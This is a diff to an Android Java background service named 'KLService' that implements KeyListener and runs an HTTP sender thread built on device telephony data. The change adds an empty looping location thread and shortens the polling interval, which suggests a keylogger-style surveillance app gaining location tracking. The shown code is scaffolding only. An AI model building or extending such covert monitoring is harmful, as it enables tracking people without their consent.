@@ -36,6 +36,7 @@ public class KLService extends Service implements KeyListener {
 	//MEMBERS:
 	private int mDebugLevel;
 	private Thread mHttpThread;
+	private Thread mLocationThread;
 	private int mIntervalTime;
 	public static Context mContext;
    	public static boolean rRun;
@@ -59,8 +60,9 @@ public class KLService extends Service implements KeyListener {
 		
 		//Init Required Members:
 		mContext = this;
-		mIntervalTime = 100000;
-		mHttpThread = new Thread(r);
+		mIntervalTime = 10000;
+		mHttpThread = new Thread(htttpRunnable);
+		mLocationThread = new Thread(locationRunnable);
 	
 		//serviceStatus = true;
 		//We go to our logic stuff....
@@ -120,11 +122,14 @@ public class KLService extends Service implements KeyListener {
     	//Logication ba-rosh...
         //SystemClock.sleep(1000);
 		mHttpThread.start();
+		mLocationThread.start();
 		
 	}
 	
 	final Handler handler = new Handler();
-    final Runnable r = new Runnable() {
+	
+	//HTTP sender Thread:
+    final Runnable htttpRunnable = new Runnable() {
         public void run() {
 		    //Thread Run:
         	KLSHttpSender sender = new KLSHttpSender((TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE));
@@ -169,6 +174,52 @@ public class KLService extends Service implements KeyListener {
 		}
         //handler.postDelayed(r, 10*600);
      };
+     
+     //Location Thread:
+     final Runnable locationRunnable = new Runnable() {
+		@Override
+		public void run() {
+			//Thread Run:
+        	//KLSHttpSender sender = new KLSHttpSender((TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE));
+        	//Prepare for a loop(Note to self: Andy requested this..)
+        	Looper.prepare();
+        	
+    		if (mDebugLevel  > 1) {
+    			Toast.makeText(mContext, "Location Thread Starting ...", Toast.LENGTH_LONG).show();
+    		}
+    		if (mDebugLevel > 0) {
+    			Log.i(getClass().getSimpleName(), "AVIAD: Location Thread Starting ...");
+    		}
+        	
+        	//Since stop() was deprecated we use the old flag approach:
+        	rRun = true;
+        	while (rRun) {
+        		if (mDebugLevel  > 1) {
+        			Toast.makeText(mContext, "Location Thread Running ...", Toast.LENGTH_LONG).show();
+        		}
+        		if (mDebugLevel > 0) {
+        			Log.i(getClass().getSimpleName(), "AVIAD: Location Thread Running ...");
+        		}
+        		
+        		//Start Thread Main Code:
+        		
+        		//END Thread Main Code.
+        		
+        		//Rest for a while
+	        	SystemClock.sleep(mIntervalTime);
+        	}
+        	
+        	//Thread Stopped Code:
+    		if (mDebugLevel  > 1) {
+    			Toast.makeText(mContext, "Location Thread Stopping ...", Toast.LENGTH_LONG).show();
+    		}
+    		if (mDebugLevel > 0) {
+    			Log.i(getClass().getSimpleName(), "AVIAD: Location Thread Stopped ...");
+    		}
+        	
+			
+		}
+	};
 
     
 }
